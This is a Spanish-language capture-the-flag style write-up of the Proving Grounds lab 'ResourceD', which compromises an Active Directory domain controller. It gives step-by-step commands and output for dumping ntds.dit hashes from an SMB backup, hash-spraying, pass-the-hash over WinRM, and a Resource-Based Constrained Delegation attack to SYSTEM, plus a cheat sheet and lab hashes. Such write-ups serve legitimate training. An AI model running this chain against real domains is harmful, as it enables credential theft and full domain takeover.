# Máquina "ResourceD" — Writeup detallado (OSCP / PG)

**Objetivo:** 192.168.207.175 (Domain Controller, dominio `resourced.local`, host `RESOURCEDC`, Windows Server 2019)
**Atacante (Kali):** tun0 = 192.168.45.201

> Nota: la IP del objetivo cambió entre sesiones (tras un revert). Siempre confirma la IP actual en el portal de PG antes de empezar.

Resumen de la cadena:
**Backup de AD en un share SMB (ntds.dit + SYSTEM) → volcado offline de hashes → hash-spray para hallar usuarios válidos → WinRM como L.Livingstone (user) → RBCD (Resource-Based Constrained Delegation) → Administrator / SYSTEM.**

---

## 0. Conceptos base

- **ntds.dit:** la base de datos de Active Directory. Contiene los hashes NT (y claves Kerberos) de **todos** los usuarios del dominio. Está cifrada con una "boot key" que vive en el hive **SYSTEM** del registro. Con ambos ficheros, se descifra offline.
- **Pass-the-Hash (PtH):** autenticarse con el hash NT en vez de la contraseña en claro. NTLM usa el hash directamente, así que no hace falta crackearlo.
- **RBCD (Resource-Based Constrained Delegation):** mecanismo de AD donde un recurso (p. ej. el DC) declara qué cuentas de máquina pueden "actuar en su nombre" hacia él. Si controlas una de esas máquinas y puedes escribir esa propiedad en el DC, puedes pedir tickets Kerberos **suplantando a cualquier usuario** (incluido Administrator).

---

## 1. Reconocimiento

```bash
# Barrido completo de puertos, rápido
sudo nmap -p- --min-rate=5000 -T4 -Pn 192.168.207.175
# Detalle de servicios sobre los puertos abiertos
sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,... -sCV -T4 -Pn 192.168.207.175
```

Puertos clave: 53, 88, 389, 445, 636, 3268/3269, 3389 (RDP), **5985 (WinRM)**, 9389 → **Domain Controller**, dominio `resourced.local`, host `RESOURCEDC` (Windows Server 2019).

## 2. Foothold: contraseña en una descripción → share con el backup de AD

### 2.1 Enumerar usuarios SIN credenciales (null session)

El DC permitía **null session** (`Null Auth:True`), así que se pueden listar los usuarios sin autenticarse:

```bash
nxc smb 192.168.207.175 -u '' -p '' --users
```

Aquí está el detalle de oro. Mira la columna **Description** de cada usuario:

```
V.Ventz   ...  New-hired, reminder: HotelCalifornia194!
```

> **Lección:** siempre revisa el campo *Description* de las cuentas. Es un sitio clásico donde los admins dejan contraseñas "temporales" y se olvidan de borrarlas. Aquí regalaba `V.Ventz:HotelCalifornia194!`.

### 2.2 Con V.Ventz, enumerar shares

```bash
nxc smb 192.168.207.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
```
```
Share            Permissions   Remark
-----            -----------   ------
...
Password Audit   READ
SYSVOL           READ          Logon server share
```

El share **`Password Audit`** (no estándar) es el objetivo: suena a backup de auditoría de contraseñas.

### 2.3 Descargar el backup de AD

```bash
smbclient "//192.168.207.175/Password Audit" -U resourced.local\\V.Ventz
```
Dentro del share hay dos carpetas: `Active Directory` y `registry`. Bajamos lo necesario para descifrar el ntds:

```
smb: \> cd registry
smb: \registry\> get SYSTEM        # hive con la boot key (imprescindible)
smb: \registry\> get SECURITY
smb: \> cd "Active Directory"
smb: \Active Directory\> get ntds.dit
```

En Kali quedan: `ntds.dit` + `SYSTEM`.

---

## 3. Volcar los hashes del dominio (offline)

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```

Esto usa la boot key del `SYSTEM` para descifrar el `ntds.dit` y saca todas las cuentas:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
krbtgt:502:...:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:...:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:...:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:...:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:...:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:...:913c144caea1c0a936fd1ccb46929d3c:::
... (y más usuarios)
```

El formato de cada línea es `usuario:RID:LMhash:NThash:::`. El que nos interesa para PtH es el **NThash** (la 4ª columna).

---

## 4. ¿Qué hash sirve? → Hash-spray (la parte metodológica importante)

Como el `ntds.dit` es un **backup**, muchos hashes estarán **caducados** (la contraseña cambió en el DC real). **No se adivina cuál vale: se prueban todos y el DC responde.**

Lógica: las cuentas sensibles (Administrator, krbtgt) suelen rotar su contraseña; las cuentas de usuarios normales casi nunca. Por eso lo esperable es que el Administrator del backup falle y algún usuario normal siga válido.

```bash
# fichero de usuarios
cat > users.txt <<'EOF'
Administrator
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
...
EOF

# fichero con los NThash (mismo orden no importa, nxc prueba combinaciones)
cat > hashes.txt <<'EOF'
12579b1666d4ac10f0f59f300776495f
...
19a3a7550ce8c505c2d46b5e39d6f808
...
913c144caea1c0a936fd1ccb46929d3c
...
EOF

nxc smb <IP> -u users.txt -H hashes.txt --continue-on-success | grep '\[+\]'
```

Resultado — el DC marca con `[+]` los que **siguen vivos**:
```
[+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
[+] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c
```

Diferencia clave:
- **Salida vacía** en `nxc` = no hay conexión (VPN caída / máquina parada / IP mal).
- **`[-] STATUS_LOGON_FAILURE`** = conecta pero el hash no vale (caducado).
- **`[+]`** = credencial válida.

> Alternativa para orientarte sin spray a ciegas: enumerar el dominio (null session, `--rid-brute`, `enum4linux-ng`) y, una vez con cualquier credencial válida, correr **BloodHound** para ver qué usuario tiene caminos de privilegio hacia el DC.

---

## 5. Acceso de usuario: WinRM como L.Livingstone

```bash
nxc winrm <IP> -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808   # (Pwn3d!)
evil-winrm -i <IP> -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```
```
type C:\Users\L.Livingstone\Desktop\local.txt
```

Comprobación de privilegios — aquí aparece la pista de la escalada:
```
whoami /priv
# SeMachineAccountPrivilege   Add workstations to domain   Enabled
```

**`SeMachineAccountPrivilege` = puedes crear cuentas de máquina en el dominio.** Ese es el requisito #1 para RBCD. El requisito #2 (poder escribir la propiedad de delegación en el DC) lo tiene L.Livingstone por sus permisos sobre `RESOURCEDC$` (se confirma con BloodHound: `GenericAll`/`GenericWrite` sobre el objeto del DC).

---

## 6. Escalada a Administrator: ataque RBCD

Idea del ataque en 4 movimientos:
1. **Creo una máquina mía** en el dominio (`FAKE01$`).
2. **Digo al DC que confíe en mi máquina** para actuar en nombre de otros (escribo `msDS-AllowedToActOnBehalfOfOtherIdentity` en `RESOURCEDC$`).
3. **Pido un ticket de servicio al DC haciéndome pasar por Administrator** (S4U2Self + S4U2Proxy).
4. **Uso ese ticket** para conectarme al DC como Administrator → SYSTEM.

### Preparación (DNS + reloj — Kerberos es muy estricto)
```bash
echo '192.168.207.175 resourcedc.resourced.local resourced.local RESOURCEDC' | sudo tee -a /etc/hosts
sudo ntpdate 192.168.207.175     # sincroniza la hora con el DC (evita KRB_AP_ERR_SKEW)
```

### Paso 1 — crear la máquina falsa (usa SeMachineAccountPrivilege)
```bash
impacket-addcomputer resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 \
  -computer-name 'FAKE01$' -computer-pass 'Fake1234!' -dc-ip 192.168.207.175
# [*] Successfully added machine account FAKE01$ with password Fake1234!.
```

### Paso 2 — configurar la delegación RBCD en el DC
```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'RESOURCEDC$' -action write \
  resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -dc-ip 192.168.207.175
# [*] Delegation rights modified successfully!
# [*] FAKE01$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

### Paso 3 — pedir el ticket suplantando a Administrator (S4U)
```bash
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator \
  'resourced.local/FAKE01$:Fake1234!' -dc-ip 192.168.207.175
# [*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```
El SPN debe ir con el **FQDN** (`resourcedc.resourced.local`), nunca la IP: Kerberos valida por nombre, por eso lo pusimos en `/etc/hosts`.

### Paso 4 — usar el ticket y obtener SYSTEM
```bash
export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local
```
```
whoami                                           # nt authority\system
type C:\Users\Administrator\Desktop\proof.txt    # flag de root
```

> `-k` = usar Kerberos (el ticket del `KRB5CCNAME`); `-no-pass` = no pedir contraseña.
> Alternativas con el mismo ticket: `impacket-wmiexec -k -no-pass resourcedc.resourced.local`, o `impacket-secretsdump -k -no-pass resourcedc.resourced.local` (vuelca el hash **actual** del Administrator, ya válido, para un PtH limpio después).

---

## 7. Chuleta rápida (cadena completa)

```bash
# 0. Foothold: null session -> descripción con pass -> share con el backup
nxc smb <IP> -u '' -p '' --users                       # mira la columna Description
nxc smb <IP> -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
smbclient "//<IP>/Password Audit" -U resourced.local\\V.Ventz   # get SYSTEM + ntds.dit

# 1. Volcar hashes del backup
impacket-secretsdump -ntds ntds.dit -system SYSTEM local

# 2. Hash-spray para hallar usuarios válidos
nxc smb <IP> -u users.txt -H hashes.txt --continue-on-success | grep '\[+\]'

# 3. User
evil-winrm -i <IP> -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

# 4. RBCD (prep)
echo '<IP> resourcedc.resourced.local resourced.local RESOURCEDC' | sudo tee -a /etc/hosts
sudo ntpdate <IP>

# 5. RBCD (ataque)
impacket-addcomputer resourced.local/L.Livingstone -hashes :<hashLiv> -computer-name 'FAKE01$' -computer-pass 'Fake1234!' -dc-ip <IP>
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'RESOURCEDC$' -action write resourced.local/L.Livingstone -hashes :<hashLiv> -dc-ip <IP>
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator 'resourced.local/FAKE01$:Fake1234!' -dc-ip <IP>
export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local
```

---

## 8. Lecciones clave

0. **Revisa siempre el campo *Description* de los usuarios** (`nxc smb --users`, incluso con null session). Aquí había una contraseña (`HotelCalifornia194!` para V.Ventz) regalada ahí.
1. **ntds.dit + SYSTEM = todo el dominio.** Con ambos ficheros vuelcas offline todos los hashes (`secretsdump -ntds -system LOCAL`).
2. **Un `ntds.dit` suele ser un backup viejo.** No asumas que el hash del Administrator vale. **Rocía todos los hashes** y deja que el DC te marque los válidos (`--continue-on-success | grep '[+]'`).
3. **Diferencia los síntomas en `nxc`:** vacío = sin conexión; `[-] LOGON_FAILURE` = hash caducado; `[+]` = válido.
4. **`SeMachineAccountPrivilege` + escritura sobre el DC = RBCD.** Es la pista para la escalada: crear máquina → delegar → S4U → impersonar Administrator.
5. **Kerberos es quisquilloso:** sincroniza el reloj (`ntpdate`) y usa **FQDN** (no IP) en los SPN y en `/etc/hosts`, o verás `KRB_AP_ERR_SKEW` / errores de nombre.
6. **Buena práctica:** la máquina `FAKE01$` que creaste queda en el dominio. En un pentest real conviene limpiarla (`impacket-addcomputer ... -delete` o `impacket-rbcd -action flush`).
